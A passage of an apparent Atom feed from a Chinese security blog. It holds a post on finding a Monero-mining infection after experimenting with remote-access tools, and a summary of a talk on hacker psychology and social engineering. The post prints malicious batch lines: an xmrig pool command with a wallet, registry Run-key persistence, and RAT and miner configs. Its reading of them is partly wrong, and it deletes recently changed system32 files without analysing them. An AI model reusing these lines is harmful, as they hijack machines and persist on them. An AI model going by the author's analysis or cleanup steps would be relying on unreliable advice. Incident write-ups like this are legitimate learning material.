      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在进行渗透测试的过程中，有时候需要对APP进行逆向分析，但是如果APP被加壳以后，就看不到里面的源代码了。所以我们需要对加壳的APP先进行脱壳处理。常用的加壳有：奇虎360，爱加密，梆梆安全等。今天给大家介绍的就是使用反射大师3.0脱360的壳。&lt;/p&gt;
    
    </summary>
    
      <category term="逆向分析" scheme="https://www.mad-coding.cn/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="脱壳" scheme="https://www.mad-coding.cn/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>记一次主机中挖矿病毒</title>
    <link href="https://www.mad-coding.cn/2019/11/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"/>
    <id>https://www.mad-coding.cn/2019/11/21/记一次主机中挖矿病毒/</id>
    <published>2019-11-21T15:37:39.000Z</published>
    <updated>2019-11-22T02:55:41.992Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>近日因为在一些文章中看到了远控这块，所以就在网上找了一些资源小研究了一下，然而今天研究完关机，回去重启以后出现下面这个弹框。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121234718.png" class="lozad"></p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a10bd43fe05fe1f6e4cc9aa9c508362a.jpg" class="lozad"></p><a id="more"></a><p>前方低能，各位大佬勿喷~</p><h1 id="0x01-溯源分析"><a href="#0x01-溯源分析" class="headerlink" title="0x01 溯源分析"></a>0x01 溯源分析</h1><p>对于那个黑框框中的exe文件，我先百度了一波。发现是一个挖矿病毒</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121235715.png" class="lozad"></p><p>知道这是病毒了，但是不知道在哪啊，溯源？咋溯源？咱也不知道啊，咋整？还是360香~~</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121235306.png" class="lozad"></p><p>根据360的扫描结果定位到system32这个目录。先不一键处理，先到这个目录看看情况吧。在C盘中看到如下一些文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121235558.png" class="lozad"></p><p>打开这个文件，代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">xmrig.exe -o xmr.crypto-pool.fr:3333 -u 45U77PaDJanVNk3ePum21GTB3BbA89ppF6Jo8UMpadCp9gnm9W9amSE4LNCk4tsiS1PNALDMUjvPF8PPVtkgikggJZeuChz -p x -k -B</span><br><span class="line">Pause</span><br></pre></td></tr></table></figure><p>emmmm，虽然，好像，看不懂这个代码的具体意思，但是根据我的一些经验来看，应该是xmrig这个程序输出 xmr.crypto-pool.fr这个文件，在网上看到这就是个挖矿的病毒程序，并且采用了一些加密的方式，后面密文估计就是加密的啥玩意（我也不懂，手动滑稽）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122092312.png" class="lozad"></p><p>再看看start.cmd</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093214.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">xmrig.exe</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>看看run.bat中的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v BGClient /t REG_SZ /d C:\System32\TTy_start.bat /F</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>从这个代码来看，是将C:\System32\TTy_start.bat添加到注册表了，到这个对应的注册表看看吧。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093606.png" class="lozad"></p><p>果然在注册表中找到了这个批处理文件，并且从注册表中的意思就可以看出来意思是每次开机都会启动这个C:\System32\Tty_start.bat这个批处理文件。</p><p>分析完注册表，我们再到system32这个文件夹 ，看到文件夹中还有两个config的文件，就打开看了一下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093736.png" class="lozad"></p><p>打开config.xml代码如下，有个2222端口，2222端口是我今天使用配置的端口，我猜测这应该是我今天使用产生的配置文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Rev&gt;</span><br><span class="line">&lt;Socket_Key&gt;</span><br><span class="line">&lt;![CDATA[Revenge-RAT]]&gt;</span><br><span class="line">&lt;/Socket_Key&gt;</span><br><span class="line">&lt;Connections_Port&gt;</span><br><span class="line">&lt;![CDATA[2222]]&gt;</span><br><span class="line">&lt;/Connections_Port&gt;</span><br><span class="line">&lt;Minimizing&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Minimizing&gt;</span><br><span class="line">&lt;Listening&gt;</span><br><span class="line">&lt;![CDATA[False]]&gt;</span><br><span class="line">&lt;/Listening&gt;</span><br><span class="line">&lt;Ping&gt;</span><br><span class="line">&lt;![CDATA[15]]&gt;</span><br><span class="line">&lt;/Ping&gt;</span><br><span class="line">&lt;Visual&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Visual&gt;</span><br><span class="line">&lt;Notification&gt;</span><br><span class="line">&lt;![CDATA[False]]&gt;</span><br><span class="line">&lt;/Notification&gt;</span><br><span class="line">&lt;Sound&gt;</span><br><span class="line">&lt;![CDATA[False]]&gt;</span><br><span class="line">&lt;/Sound&gt;</span><br><span class="line">&lt;Desktop&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Desktop&gt;</span><br><span class="line">&lt;DesktopValue&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/DesktopValue&gt;</span><br><span class="line">&lt;Webcam&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Webcam&gt;</span><br><span class="line">&lt;WebcamValue&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/WebcamValue&gt;</span><br><span class="line">&lt;ThumbnailsValue&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/ThumbnailsValue&gt;</span><br><span class="line">&lt;Flags&gt;</span><br><span class="line">&lt;![CDATA[1]]&gt;</span><br><span class="line">&lt;/Flags&gt;</span><br><span class="line">&lt;Gridlines&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Gridlines&gt;</span><br><span class="line">&lt;View&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/View&gt;</span><br><span class="line">&lt;Theme&gt;</span><br><span class="line">&lt;![CDATA[0]]&gt;</span><br><span class="line">&lt;/Theme&gt;</span><br><span class="line">&lt;ACR&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/ACR&gt;</span><br><span class="line">&lt;/Rev&gt;</span><br></pre></td></tr></table></figure><p>在打开config.json看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;algo&quot;: &quot;cryptonight&quot;,</span><br><span class="line">    &quot;api&quot;: &#123;</span><br><span class="line">        &quot;port&quot;: 0,</span><br><span class="line">        &quot;access-token&quot;: null,</span><br><span class="line">        &quot;id&quot;: null,</span><br><span class="line">        &quot;worker-id&quot;: null,</span><br><span class="line">        &quot;ipv6&quot;: false,</span><br><span class="line">        &quot;restricted&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;asm&quot;: true,</span><br><span class="line">    &quot;autosave&quot;: true,</span><br><span class="line">    &quot;av&quot;: 0,</span><br><span class="line">    &quot;background&quot;: false,</span><br><span class="line">    &quot;colors&quot;: true,</span><br><span class="line">    &quot;cpu-affinity&quot;: null,</span><br><span class="line">    &quot;cpu-priority&quot;: null,</span><br><span class="line">    &quot;donate-level&quot;: 5,</span><br><span class="line">    &quot;huge-pages&quot;: true,</span><br><span class="line">    &quot;hw-aes&quot;: null,</span><br><span class="line">    &quot;log-file&quot;: null,</span><br><span class="line">    &quot;max-cpu-usage&quot;: 100,</span><br><span class="line">    &quot;pools&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;url&quot;: &quot;donate.v2.xmrig.com:3333&quot;,</span><br><span class="line">            &quot;user&quot;: &quot;YOUR_WALLET_ADDRESS&quot;,</span><br><span class="line">            &quot;pass&quot;: &quot;x&quot;,</span><br><span class="line">            &quot;rig-id&quot;: null,</span><br><span class="line">            &quot;nicehash&quot;: false,</span><br><span class="line">            &quot;keepalive&quot;: false,</span><br><span class="line">            &quot;variant&quot;: -1,</span><br><span class="line">            &quot;tls&quot;: false,</span><br><span class="line">            &quot;tls-fingerprint&quot;: null</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;print-time&quot;: 60,</span><br><span class="line">    &quot;retries&quot;: 5,</span><br><span class="line">    &quot;retry-pause&quot;: 5,</span><br><span class="line">    &quot;safe&quot;: false,</span><br><span class="line">    &quot;threads&quot;: null,</span><br><span class="line">    &quot;user-agent&quot;: null,</span><br><span class="line">    &quot;watch&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有个pools</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093834.png" class="lozad"></p><p>WC，这TM不会是别人的远程连接马吧，现在还连接着我的电脑？？？</p><p>ping了一下，还真能ping通。WCNM。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093852.png" class="lozad"></p><p><img alt="img" data-src="https://i04piccdn.sogoucdn.com/98d3e7149f4dcaa6" class="lozad"></p><h1 id="0x02-消毒"><a href="#0x02-消毒" class="headerlink" title="0x02 消毒"></a>0x02 消毒</h1><p>听说有人要消毒？我带了瓶84，不知道够不够用。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/f0b07d459c73cb3c" class="lozad"></p><p>首先删除我们刚刚在注册表中的BGClient这一项。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093920.png" class="lozad"></p><p>然后到C盘将system32这个目录直接删掉</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122094001.png" class="lozad"></p><p>本来以为这样就完事了，又去Windows下的system32看了一下，我看到system32的最后修改时间是11月21日，我靠不就是今天吗，不会这里面也被写了什么东西了吧，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122094109.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122094138.png" class="lozad"></p><p>进去按照时间排序来看果然有几个文件，看着就很像病毒或者被病毒捆绑的玩意。奈何自己太菜，还不能分析这些东西，算了，干脆一不做二不休，直接删了得了。（我真聪明，手动大笑）</p><p>最后，清空回收站，重启~~</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/1f11ba1aee6f4ec4" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>研究技术会有可能被反噬的，大家要注意安全。不安全的软件先扔到虚拟机里面搞搞，没有问题在拿到本机来用，万一虚拟机炸了，还可以快照一键还原啊。</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/88ef46f391bf4d14" class="lozad"></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;近日因为在一些文章中看到了远控这块，所以就在网上找了一些资源小研究了一下，然而今天研究完关机，回去重启以后出现下面这个弹框。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121234718.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a10bd43fe05fe1f6e4cc9aa9c508362a.jpg&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="病毒分析" scheme="https://www.mad-coding.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
      <category term="病毒" scheme="https://www.mad-coding.cn/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>黑客心理学--社会工程学原理</title>
    <link href="https://www.mad-coding.cn/2019/11/13/%E9%BB%91%E5%AE%A2%E5%BF%83%E7%90%86%E5%AD%A6/"/>
    <id>https://www.mad-coding.cn/2019/11/13/黑客心理学/</id>
    <published>2019-11-13T06:39:51.000Z</published>
    <updated>2019-11-13T07:34:34.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>该文章整理自第七届互联网安全大会，杨义先教授的PPT内容。杨义先-北京邮电大学信息安全中心主任。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191113145011.png" class="lozad"></p><h1 id="0x01-大会前奏"><a href="#0x01-大会前奏" class="headerlink" title="0x01 大会前奏"></a>0x01 大会前奏</h1><p>大会刚开始，杨教授推荐了几本书</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191113145347.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191113145414.png" class="lozad"></p><p>补天系列丛书”的体系<br>《安全简史》 ：风趣幽默的安全科普；增强全民对抗黑客攻击，整体全面提<br>高网络安全强度。外行不觉深，内行不觉浅<br>《博弈系统论》（待出版） ：黑客行为预测与管理<br>《安全通论》： 在理工科范围内（不含心理学、社会学、经济学、管理学<br>等），几乎没有任何限制（如设备、环境和人员等）的前提下，揭示黑客攻防<br>和安全演化的基本规律。这些规律可以适用于网络空间安全的各主要分支<br>《黑客心理学》： 1）填补全球信息安全界的一个重大空白，努力实现人、<br>网、环境“闭环系统”全方位安全。2）提高全民的防骗、防黑客意识和水平。</p><blockquote><p>《黑客心理学》小结<br>攻城为下，攻心为上；<br>攻网为下，攻人为上。<br>如何攻城，假假真真；<br>如何攻人，社会工程。</p></blockquote><p>因此，本书的副标题叫“社会工程学原理”，即，从原理层次，穷尽所有可能的社工手段。</p><h1 id="0x02-大会正文"><a href="#0x02-大会正文" class="headerlink" title="0x02 大会正文"></a>0x02 大会正文</h1><h2 id="2-1《黑客心理学》的背景"><a href="#2-1《黑客心理学》的背景" class="headerlink" title="2.1《黑客心理学》的背景"></a>2.1《黑客心理学》的背景</h2><ol><li>所有信息安全问题，全都归罪于人！具体地说，归罪于三类人：破坏者（黑客）、保卫者（红客）和使用者（用户）。</li><li>但全球信息安全界，几乎都聚焦于网络或环境安全，而忽略了一个最关键的事实：黑客是人</li><li>反而是黑客们，常常基于心理学成果，利用“社会工程学”（简<br>称“社工”），来攻击“人”；并以此为突破口，结合各种技术<br>和非技术手段，把用户和红客打得落花流水</li><li>“人”只不过是木偶，而人的“心理”才是拉动木偶的那根线；<br>或者说，“人”只不过是“魄”，而“心理”才是“魂</li><li>所以，网络空间安全的根本核心，其实隐藏在人的心里。因此，《黑客心理学》希望借助心理学、社会学，来揭示信息安全的人心奥秘！</li><li>《黑客心理学》希望穷尽所有社工攻击的基本“元素”，即，所<br>有无数种社工攻击方法，都只是这些有限个“元素”的某种融合<br>而已。就像门捷列夫元素周期表中有限（数百）种元素，就能组成宇宙中无数种物质一样；实际上，社工攻击“元素”也只有数百种，被黑客常用的就更少了。</li><li>在人、网、环境的闭环系统中，后两者“没天敌”，只需不断<br>“水涨船高”就行；但是，人是有天敌的，人性的弱点有许多共<br>同处，很难“打补丁”</li><li>总之，赢人者，赢天下；胜人者，胜世界！</li><li>由于“三种人”的目标、地位和能力等各不相同，所以，在网络<br>空间安全攻防过程中，他们的心理因素也会不同。《黑客心理学》将重点探索最具网络特色的黑客心理，因为，若无黑客，几乎就没有安全问题。但遗憾的是，黑客过去存在，现在存在，今后也将永远存在；甚至还可能越来越多</li></ol><h2 id="2-2-黑客的动机、着眼点、机会"><a href="#2-2-黑客的动机、着眼点、机会" class="headerlink" title="2.2 黑客的动机、着眼点、机会"></a>2.2 黑客的动机、着眼点、机会</h2><ol><li><p>从心理学角度看，黑客行为的动机，主要基于如下几种心理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自我表现心理、好奇探秘心理、义愤抗议心理、戏谑心理、非法占有心理、渴望认同心理、自我解嘲心理、发泄心理等</span><br></pre></td></tr></table></figure></li><li><p>反过来，黑客发动攻击时，又利用了被害者的哪些心理呢？归纳起来，至少有如下几种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恐惧心理、服从心理、贪婪心理、同情心理</span><br></pre></td></tr></table></figure></li><li><p>引发红客和用户不安全的心理因素，主要有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省能心理、侥幸心理、逆反心理、凑兴心理、群体心理、注意与不注意</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-3-与安全密切相关的心理因素"><a href="#2-3-与安全密切相关的心理因素" class="headerlink" title="2.3 与安全密切相关的心理因素"></a>2.3 与安全密切相关的心理因素</h2><ol><li><p>性格与安全：下面8种性格，不利于安全：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击型性格。</span><br><span class="line">性情孤僻、固执、心胸狭窄。</span><br><span class="line">性情不稳定，易受情绪感染支配，易于冲动，情绪伏波动很大，受情绪影响长时间不易平静</span><br><span class="line">心境抑郁，浮躁不安者</span><br><span class="line">马虎、敷衍、粗心</span><br><span class="line">危急关头，惊慌失措、优柔寡断、鲁莽行事</span><br><span class="line">感知、思维、运动迟钝、不爱活动、懒惰者</span><br><span class="line">懦弱、胆怯、没主见者。</span><br></pre></td></tr></table></figure></li><li><p>能力与安全：<br>只有当能力与任务难度匹配时，才不容易出现安全问题。思维能力强的人，在面对重复的、一成不变的、不需动脑筋的简单操作时，就会感到单调乏味；从而埋下安全隐患。反之，能力较低的人，在面对力所不及的任务时，就会感受到无法胜任，甚至会过度紧张；从而，也容易引发安全问题。</p></li><li><p>情绪、情感与安全：<br>积极情绪，可加深安全重要性认识，具有“增力作用”，能激发安全动机，采取积极态度。而消极情绪，会使人带着厌恶的情感去看待安全，具有“减力作用”，采取消极的态度，从而容易引发不安全行为。</p></li><li><p>意志与安全：<br>意志对安全行为，起着重要的调节作用，主要是：合理控制情绪，克服不利于安全的心理障碍，并调动有利于安全的心理因素，坚持不懈地实现安全目标。</p></li><li><p>感知觉与安全：<br>安全预防的水平，首先取决于对风险的认识水平；对风险认识越深刻，出现问题的可能性就越小</p></li><li><p>个性心理与安全：<br>不良的个性心理特征，常是引发安全问题的直接原因。比如，有的认真负责，有的马虎敷衍；有的谨慎细心，有的粗心大意。对待前人的安全经验，有的不予盲从，事实求是；有的不敢抵制，违心屈从等</p></li><li><p>气质与安全：<br>有些工作，比如，个性化较强的OA类开发，需要反应迅速、动作敏捷、<br>活泼好动、善于交际的人去承担。有些工作，比如，软件漏洞检测等，<br>则需要仔细的、情绪比较稳定的、安静的人去做。等</p></li><li><p>个性对不安全行为的影响，主要表现在两方面：<br>1），态度的影响。<br>2），动机的影响。</p></li><li><p>行为退化对安全的影响：<br>比如：若劳动时间太长，就会产生疲劳；若生活节律被干扰，就不能有<br>效发挥体能；若失去完成任务的动力，就会懒散懈怠；若缺乏鼓励，就<br>会泄气；若突然面对危险，就会产生应激反应等</p></li><li><p>失误与安全的关系及影响：<br>第1，失误是不可避免的副产物，失误率可以测定。<br>第2，工作环境可以诱发失误；故可通过改善工作环境，来防<br>止失误。<br>第3，下级的失误，也许能反映上级的职责缺陷。<br>第4，人的行为，反映其上级的态度；比如仅凭直觉去解决安<br>全问题，或仅靠侥幸来维护安全，那迟早会出问题。<br>第5，过时的惯例，可能促发失误。<br>第6，不安全行为，是操作员促发的、直接导致危害的失误，<br>属于失误的特例。级别越高的人，其失误的后果就越严重。</p></li></ol><h2 id="2-4-黑客攻击行为的分类"><a href="#2-4-黑客攻击行为的分类" class="headerlink" title="2.4 黑客攻击行为的分类"></a>2.4 黑客攻击行为的分类</h2><ol><li>网络黑客攻击是指，违背他人意愿，采取信息手段等非身体接触方式，以伤害他人（的财产或心灵）为目标的行为。</li><li>无论攻击行为是发生在网上或网下，黑客行为的最终效果都主要体现在网络空间中</li><li>按攻击目的划分，黑客行为可大致归为四类：<ol><li>观点表达型</li><li>情绪宣泄型</li><li>利益诉求型</li><li>网络犯罪型</li></ol></li></ol><h2 id="2-5-黑客攻击行为的本能说"><a href="#2-5-黑客攻击行为的本能说" class="headerlink" title="2.5 黑客攻击行为的本能说"></a>2.5 黑客攻击行为的本能说</h2><ol><li>本能说认为：攻击行为是由基因设定的，与遗传相关，它是人类为确保自身安全而形成的一种本能；这种本能经长期进化而来，攻击性强的个体，往往更具生存优势，</li><li>因此，按照本能说<ol><li>黑客攻击是不可避免的</li><li>对攻击行为可定期加以发泄；以无破坏性发泄方式，代替破坏性发泄方式。</li></ol></li></ol><h2 id="2-6-黑客攻击行为的非本能说"><a href="#2-6-黑客攻击行为的非本能说" class="headerlink" title="2.6 黑客攻击行为的非本能说"></a>2.6 黑客攻击行为的非本能说</h2><ol><li><p>非本能说之“挫折理论”认为：</p><ol><li>攻击来源于挫折</li></ol></li><li><p>挫折理论对网络安全的启发至少有：</p><ol><li>无论如何，都不要在网络中激发不必要的矛盾，更不要使任何人遭受不必要的挫折，这样便可大幅度地减少黑客的攻击行为。</li><li>看来，构建和谐的网络社会，对信息安全也是很有利的嘛。</li></ol></li><li><p>非本能说之“社会学习理论”认为：</p><ol><li>人并不是生来就具有攻击能力的，这种能力必须通过学习才能获得。这种学习，是通过观察榜样的行为及其后果来实现的，故又称为观察学习。</li><li>观察了他人的攻击行为及其后果后，人便会形成攻击的观念，并以此指导自己的攻击行为。</li><li>所以，黑客的攻击行为，具有一定的传染性。</li></ol></li></ol><h2 id="2-7-黑客攻击意愿的弱化"><a href="#2-7-黑客攻击意愿的弱化" class="headerlink" title="2.7 黑客攻击意愿的弱化"></a>2.7 黑客攻击意愿的弱化</h2><ol><li>无害宣泄；<br>习得的抑制，即，指人们在社会生活中所学到的，对攻击行为的控制；主要指<ol><li>社会规范的抑制</li><li>痛苦线索的抑制（想象被害者的惨状）</li><li>对报复的畏惧等三点。</li></ol></li><li>置换与替罪羊：当某人遭受挫折，但他又对施害者无可奈何时，就会通过别的方式满足自己的需求；<ol><li>方式之一，便是置换对象，攻击那些与施害者相似的对象</li></ol></li></ol><h2 id="2-8-社工黑客攻击的特点"><a href="#2-8-社工黑客攻击的特点" class="headerlink" title="2.8 社工黑客攻击的特点"></a>2.8 社工黑客攻击的特点</h2><ol><li><p>攻击的直接对象是热血的“人” ，而不是冷血的“设备”，虽然<br>可以运用各种设备来当武器。</p></li><li><p>是一种赛博式攻击，即，常常是需要与被攻击者之间进行多次信息互动，逐步诱导</p></li><li><p>黑客与被攻击的“人”之间，并无直接的身体接触；所以，社工<br>攻击的武器其实只是“信息”，攻击成果的表现形式也是“信息”</p></li><li><p>社工攻击，正在成为黑客攻击的必备手段；甚至，在所有重大黑客事件中，社工攻击几乎都是先锋队的主力军。</p></li><li><p>社工攻击的另一突出特点是：若你不了解它，那它将威力无穷；若你知道它正在攻击你，那你一定会逢凶化吉。比如，当你知道正在接听的某个电话，是诈骗电话时；就算骗子再高明，你也不会上当，甚至还可以随心所欲地戏弄他一番。</p></li><li><p>综合社工攻击的上述特点，请问：</p><ol><li>还有必要假装高雅，而对“社工攻击”不屑一顾吗？<br>还能假装强大，而视“社工攻击”为无物吗？</li></ol></li><li><p>若仅停留在外观，那“社工攻击”手段无穷无尽。就像站在分子<br>层次，人类将永远无法知道“到底有多少种物质”一样；但若深<br>入到人性的底层本质，便可穷尽组成所有无数种社工攻击的少数几个“元素”</p></li></ol><h2 id="2-9-社工黑客如何看待个体"><a href="#2-9-社工黑客如何看待个体" class="headerlink" title="2.9 社工黑客如何看待个体"></a>2.9 社工黑客如何看待个体</h2><ol><li><p>回顾历史的有趣循环：当年，在心理学重大成果（发现了“反馈<br>+微调+迭代”赛博链）的启发下，人类造“电脑”，当时的模<br>特儿是“人脑”；然后，又造了电脑网络；</p></li><li><p>如今，社工黑客在攻击“人脑”时，又是采用“反馈+微调+迭<br>代”的赛博攻击链，又是拿“电脑”当模特儿</p></li><li><p>社工将人看“电脑”，由四部分组成：<br>1）输入：包括外部输入（即，感觉等）、内部反馈输入（即，<br>知觉、动机、情绪和情感等）、噪音输入（即，无意识等）；<br>2）输出：信息输出（即，语言等）、行为输出、内部反馈输<br>出（即，动机、知觉、情绪和情感等）、噪音输出（即，无<br>意识等）<br>3）存储：包括记忆、习惯、无意识等；<br>4）处理：包括计算（即，思维、认知）、去噪（即，注意<br>等）、优化（即，学习、发展）</p></li></ol><h2 id="2-10-社工黑客攻击人的思路"><a href="#2-10-社工黑客攻击人的思路" class="headerlink" title="2.10 社工黑客攻击人的思路"></a>2.10 社工黑客攻击人的思路</h2><ol><li>欲攻破人这个“热血电脑”，就必须使其信息失控；</li><li>欲使信息失控，只需攻破输入、输出、存储或处理四大部分中的任何一部分；</li><li>欲攻破任何一部分，就必须充分利用心理学家已揭示的人性弱点；</li><li>欲充分利用这些弱点，就必须：<ol><li>要么使攻击对象在赛博式反馈循环中被诱入歧途，</li><li>要么截获并利用无意识的噪音输出等。</li><li>至于如何达到这些目标，将是《黑客心理学》的任务，欢迎大家详细阅读。</li></ol></li></ol><h2 id="2-11-社工黑客攻击群体的思路"><a href="#2-11-社工黑客攻击群体的思路" class="headerlink" title="2.11 社工黑客攻击群体的思路"></a>2.11 